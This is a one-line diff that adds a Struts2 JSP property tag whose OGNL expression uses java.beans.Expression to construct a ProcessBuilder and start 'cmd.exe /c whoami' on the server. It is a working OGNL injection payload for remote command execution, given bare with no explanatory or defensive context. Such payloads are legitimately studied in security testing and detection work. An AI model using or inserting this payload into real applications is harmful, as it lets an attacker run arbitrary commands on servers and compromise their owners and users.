@@ -1,0 +1,1 @@
+<s:property value="%{new java.beans.Expression(new java.beans.Expression(@java.lang.ProcessBuilder@class,"new",new Object[]{new String[]{"cmd.exe","/c","whoami"}}).getValue(),"start",new Object[0]).getValue()}"/>
